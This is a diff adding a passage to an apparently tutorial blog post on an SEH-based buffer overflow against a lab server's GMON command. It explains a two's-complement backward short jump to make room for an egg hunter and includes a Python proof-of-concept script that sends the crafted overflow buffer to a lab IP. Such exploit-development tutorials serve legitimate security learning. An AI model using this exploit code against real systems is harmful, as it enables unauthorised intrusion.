@@ -156,4 +156,27 @@ Notice where we are!!!! Look at the 3 values below our current instruction! You 
 The address `00C0FFDC` is the "Pointer to next SEH record", which is nSEH. That address, as shown in image after we stepped thorugh the `pop pop ret` instructions, is the address of where our B's (42 hex) start. Awesome! Now what could we do from here? We could do a typical jump to ESP to execute shellcode! But we have a slight issue. ESP only has the capability to hold less than 30 bytes:
 <img src="{{ site.url }}{{ site.baseurl }}/images/ugh.png" alt="">
 
-This is not even enough for our egg hunter to go! What can we do? Well one thing we are going to have to do is some math! But we can make a jump backwards into our "A" (41 hex) buffer and store our egg hunter there.
+This is minute amount of space is not even enough for our egg hunter to go! What can we do? Well one thing we are going to have to do is some math! But we can make a jump backwards into our "A" (41 hex) buffer and store our egg hunter there. As you may or may not know, there are no actual negative numbers in hex. We can however use something known as the two's compliment to obtain a hex value that we can push onto the stack to make a jump backwards. We need 32 bytes for our egg hunter, so let's jump 40 bytes backwards. I am not going to get into the low level math of the two's compliment (although it is not too difficult, and that is coming from someone who is subpar on a good day in arithmetic). Here is a [Two's Compliment Calculator](https://www.exploringbinary.com/twos-complement-converter/). The two's compliment is just a way to represent a negative number in hex. The two's compliment of 40 in binary is `1101 1000`. Converting this value to hex gives us `D8`. The opcode for a short jump is `EB`. We can use an instruction of `EB D8` to jump us back 40 bytes, in order to store our egg hunter! Let's update our PoC to reflect this and validate (Remember that we are filling nSEH with the our jump instruction):
+```console
+#!/usr/bin/python
+import socket
+import sys
+import os
+
+#Vulnerable command
+command = "GMON /.:/"
+
+pwn = "A" * 3495
+pwn+= "\xeb\xd8\x90\x90"
+pwn+= "\xb3\x11\x50\x62"
+pwn+= "D" * (5000-3495-4-4)
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("172.16.55.134", 9999))
+
+s.send(command+pwn)
+s.recv(1024)
+s.close()
+```
+Before we execute, take note of the `\x90` instructions in the jump instruction. These are no operators that literally do nothing. They are just there as place holders, because the register needs four bytes- and we only had two. Carrying on...
+
